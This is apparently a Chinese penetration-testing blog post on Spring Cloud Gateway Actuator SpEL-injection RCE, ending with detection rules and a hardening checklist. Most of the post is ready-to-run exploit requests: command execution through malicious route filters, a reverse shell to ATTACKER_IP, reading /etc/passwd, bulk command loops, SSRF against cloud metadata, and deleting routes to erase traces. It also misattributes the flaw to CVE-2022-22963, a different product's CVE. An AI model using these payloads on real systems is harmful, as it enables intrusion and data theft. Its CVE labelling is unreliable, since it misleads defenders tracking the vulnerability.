---
title: "Spring Cloud Gateway Actuator / SpEL 注入 RCE 利用技术"
date: 2026-06-21T16:00:00+08:00
draft: false
weight: 99
description: "Spring Cloud Gateway 渗透测试：CVE-2022-22963 Actuator 端点 SpEL 注入 RCE、路由定义恶意代码执行、Gateway API 未授权访问与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Spring Cloud Gateway", "Actuator", "SpEL Injection", "CVE-2022-22963", "RCE", "API 网关", "渗透测试"]
---

## 0x00 攻击面总览

Spring Cloud Gateway 是 Spring 生态的 API 网关，Actuator 端点暴露可导致 SpEL 注入 RCE：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| Gateway HTTP | 8080 | HTTP | 路由代理、请求转发 |
| Actuator | 8080/actuator | HTTP | 管理端点、路由管理、刷新 |
| Gateway Routes API | /actuator/gateway/routes | HTTP | 路由定义（SpEL 注入点） |
| Gateway Refresh | /actuator/gateway/refresh | HTTP | 刷新路由（触发 SpEL 执行） |

**核心威胁模型**：

```
┌───────────────────────────────────────────────────────────────┐
│                Spring Cloud Gateway                            │
│                                                               │
│  ┌──────────────────────────────────────────────────────┐     │
│  │  Actuator Endpoints :8080/actuator                    │     │
│  │  /gateway/routes/* → 路由定义（SpEL 注入点）           │     │
│  │  /gateway/refresh → 刷新路由（触发 SpEL 执行）         │     │
│  └──────────────────────┬───────────────────────────────┘     │
│                         │                                     │
│  攻击路径：                                                    │
│  ① Actuator 端点暴露 → 创建恶意路由（含 SpEL 表达式）          │
│  ② 调用 refresh 端点 → 触发 SpEL 执行 → RCE                   │
│  ③ CVE-2022-22963 → SpEL 注入 → 远程代码执行                  │
│  ④ 路由枚举 → 后端服务拓扑泄露                                │
│                                                               │
│  前提条件：                                                    │
│  • Actuator 端点对外暴露（无认证或认证绕过）                     │
│  • management.endpoints.web.exposure.include 包含 gateway      │
└───────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8080,8443 \
  --script=http-title \
  -oN scg_scan.txt <target>
```

### 1.2 版本指纹

```bash
# 检查 Actuator 端点
curl -s "http://target:8080/actuator" | python3 -m json.tool

# 响应示例
{
  "_links": {
    "self": {"href": "http://target:8080/actuator"},
    "gateway": {"href": "http://target:8080/actuator/gateway"},
    "health": {"href": "http://target:8080/actuator/health"}
  }
}

# 检查 Gateway 路由 API
curl -s "http://target:8080/actuator/gateway/routes" | python3 -m json.tool
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Spring Cloud Gateway"
port:8080 http.title:"Spring"

# FOFA
body="actuator" && body="gateway"
```

---

## 0x02 CVE-2022-22963 — SpEL 注入 RCE

### 2.1 漏洞概述

| 属性 | 详情 |
|------|------|
| 影响版本 | Spring Cloud Gateway < 3.1.1, < 3.0.7 |
| CVSS | 10.0（Critical） |
| 类型 | SpEL 表达式注入 |
| 攻击向量 | Actuator Gateway Routes API |
| 前提条件 | Actuator 端点暴露 |
| 根因 | 路由定义中的 Predicate/Filter 支持 SpEL 表达式，未做安全沙箱限制 |

### 2.2 漏洞利用 — 完整攻击链

```bash
# 步骤 1：创建包含恶意 SpEL 的路由定义
curl -s -X POST "http://target:8080/actuator/gateway/routes/hacktest" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "hacktest",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com",
    "order": 0
  }'

# 步骤 2：刷新路由触发 SpEL 执行
curl -s -X POST "http://target:8080/actuator/gateway/refresh"

# 步骤 3：通过路由访问执行结果
curl -s -H "Accept: application/json" "http://target:8080/hacktest" -D -
# 响应头中包含：Result: uid=0(root) gid=0(root) groups=0(root)
```

### 2.3 反弹 Shell

```bash
# 步骤 1：创建反弹 Shell 路由
curl -s -X POST "http://target:8080/actuator/gateway/routes/shell" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "shell",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"}).getInputStream()))}"
      }
    }],
    "uri": "http://example.com",
    "order": 0
  }'

# 步骤 2：刷新触发
curl -s -X POST "http://target:8080/actuator/gateway/refresh"

# 步骤 3：触发路由执行
curl -s "http://target:8080/shell"
```

### 2.4 任意文件读取

```bash
# 读取 /etc/passwd
curl -s -X POST "http://target:8080/actuator/gateway/routes/fileread" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "fileread",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(new java.io.FileInputStream(\"/etc/passwd\")))}"
      }
    }],
    "uri": "http://example.com",
    "order": 0
  }'

curl -s -X POST "http://target:8080/actuator/gateway/refresh"
curl -s "http://target:8080/fileread" -D -
```

---

## 0x03 Actuator 端点信息泄露

### 3.1 路由枚举

```bash
# 列出所有路由
curl -s "http://target:8080/actuator/gateway/routes" | python3 -m json.tool

# 响应示例（泄露后端服务拓扑）
[
  {
    "route_id": "user-service",
    "predicate": "Paths: /api/users/**",
    "uri": "http://user-service:8081"
  },
  {
    "route_id": "order-service",
    "predicate": "Paths: /api/orders/**",
    "uri": "http://order-service:8082"
  }
]
```

### 3.2 环境信息泄露

```bash
# 获取环境变量
curl -s "http://target:8080/actuator/env" | python3 -m json.tool

# 获取配置属性
curl -s "http://target:8080/actuator/configprops" | python3 -m json.tool

# 获取 Bean 信息
curl -s "http://target:8080/actuator/beans" | python3 -m json.tool

# 获取线程转储
curl -s "http://target:8080/actuator/threaddump" | python3 -m json.tool
```

### 3.3 健康检查与指标

```bash
# 健康检查
curl -s "http://target:8080/actuator/health" | python3 -m json.tool

# 指标信息
curl -s "http://target:8080/actuator/metrics" | python3 -m json.tool
```

---

## 0x04 高级利用技术

### 4.1 删除恶意路由（清理痕迹）

```bash
# 删除创建的路由
curl -s -X DELETE "http://target:8080/actuator/gateway/routes/hacktest"

# 刷新使删除生效
curl -s -X POST "http://target:8080/actuator/gateway/refresh"
```

### 4.2 多路由批量利用

```bash
# 批量创建多个路由实现多命令执行
for cmd in "id" "whoami" "cat /etc/passwd" "hostname"; do
  route_id="route_$(echo $cmd | md5sum | cut -c1-8)"
  curl -s -X POST "http://target:8080/actuator/gateway/routes/$route_id" \
    -H "Content-Type: application/json" \
    -d "{
      \"id\": \"$route_id\",
      \"filters\": [{
        \"name\": \"AddResponseHeader\",
        \"args\": {
          \"name\": \"Result\",
          \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"/bin/bash\\\",\\\"-c\\\",\\\"$cmd\\\"}).getInputStream()))}\"
        }
      }],
      \"uri\": \"http://example.com\",
      \"order\": 0
    }"
done

# 刷新所有路由
curl -s -X POST "http://target:8080/actuator/gateway/refresh"
```

### 4.3 SSRF 利用

```bash
# 通过路由定义实现 SSRF
curl -s -X POST "http://target:8080/actuator/gateway/routes/ssrf" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "ssrf",
    "filters": [{
      "name": "AddResponseHeader",
      "args": {
        "name": "Result",
        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(new java.net.URL(\"http://169.254.169.254/latest/meta-data/\").openStream()))}"
      }
    }],
    "uri": "http://example.com",
    "order": 0
  }'

curl -s -X POST "http://target:8080/actuator/gateway/refresh"
curl -s "http://target:8080/ssrf" -D -
```

---

## 0x05 历史 CVE 漏洞矩阵

| CVE | 类型 | CVSS | 影响 |
|-----|------|------|------|
| CVE-2022-22963 | SpEL 注入 RCE | 10.0 | Actuator 端点 SpEL 注入远程代码执行 |
| CVE-2022-22965 | RCE (Spring4Shell) | 9.8 | Spring Framework 数据绑定 RCE（关联漏洞） |

**CVE-2022-22963 影响范围**：

Spring Cloud Gateway < 3.1.1, < 3.0.7。当 Actuator 端点对外暴露时，攻击者可以通过创建恶意路由定义注入 SpEL 表达式，在刷新路由时触发执行，实现远程代码执行。CVSS 10.0。

---

## 0x06 蓝队检测方案

### 6.1 网络层检测

```yaml
title: Spring Cloud Gateway Actuator 外部访问检测
id: scg-actuator-external-access
status: experimental
description: 检测来自非内网段的 Actuator 端点访问
logsource:
  category: firewall
detection:
  selection:
    uri|contains: "/actuator"
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: critical
```

### 6.2 SpEL 注入检测

```yaml
title: Spring Cloud Gateway SpEL 注入检测
id: scg-spel-injection
status: experimental
description: 检测 Gateway 路由定义中的 SpEL 注入攻击
logsource:
  product: spring_cloud_gateway
  service: gateway
detection:
  selection_spel:
    body|contains:
      - "T(java.lang.Runtime)"
      - "T(org.springframework"
      - "getRuntime().exec"
      - "ProcessBuilder"
      - "#{new"
  selection_route:
    uri|contains: "/actuator/gateway/routes"
    method: "POST"
  condition: selection_spel and selection_route
level: critical
```

### 6.3 审计日志分析

```bash
# 监控路由创建
grep "/actuator/gateway/routes" /var/log/spring/gateway.log

# 检测 SpEL 注入特征
grep -E "(T\(java\.lang\.Runtime|getRuntime\(\)\.exec|ProcessBuilder|StreamUtils)" \
  /var/log/spring/gateway.log

# 监控路由刷新
grep "/actuator/gateway/refresh" /var/log/spring/gateway.log

# 检测异常环境变量访问
grep "/actuator/env" /var/log/spring/gateway.log
```

### 6.4 加固清单

```
[ ] 升级至 Spring Cloud Gateway >= 3.1.1 / 3.0.7（修复 CVE-2022-22963）
[ ] 禁用或限制 Actuator 端点暴露：
    management.endpoints.web.exposure.exclude=gateway
[ ] 为 Actuator 端点启用认证
[ ] Actuator 端点仅允许内网访问
[ ] 在前面放置反向代理并启用 IP 白名单
[ ] 禁用不必要的 Actuator 端点
[ ] 启用 HTTPS 并配置 TLS 证书
[ ] 启用审计日志并接入 SIEM
[ ] 监控 /actuator/gateway/routes POST 请求
[ ] 监控 /actuator/gateway/refresh 请求
[ ] 配置 WAF 规则拦截 SpEL 表达式模式
[ ] 定期审查路由定义
[ ] 限制 Spring Boot 应用的网络暴露面
```

---

## 0x07 渗透测试检查清单

```
[ ] 端口扫描：8080, 8443
[ ] Actuator 端点暴露测试（/actuator）
[ ] Gateway Routes API 未授权访问测试
[ ] CVE-2022-22963 SpEL 注入 RCE 测试
[ ] 路由枚举测试（后端服务拓扑泄露）
[ ] 环境信息泄露测试（/actuator/env）
[ ] 配置属性泄露测试（/actuator/configprops）
[ ] Bean 信息泄露测试（/actuator/beans）
[ ] 任意文件读取测试
[ ] 反弹 Shell 测试
[ ] SSRF 测试
[ ] 认证配置检查
[ ] TLS/SSL 配置检查
[ ] Actuator 端点暴露配置检查
```

---

## 0x08 小结

Spring Cloud Gateway 的攻击面以 **Actuator 端点** 为核心。**CVE-2022-22963**（CVSS 10.0）通过 Actuator Gateway Routes API 注入 SpEL 表达式实现 RCE，攻击者可以创建恶意路由定义，在刷新路由时触发 SpEL 执行。Actuator 端点还泄露大量敏感信息（环境变量、配置属性、后端服务拓扑）。蓝队应重点关注：升级至修复版本、禁用或限制 Actuator 端点暴露、启用认证、限制网络访问、将审计日志接入 SIEM。
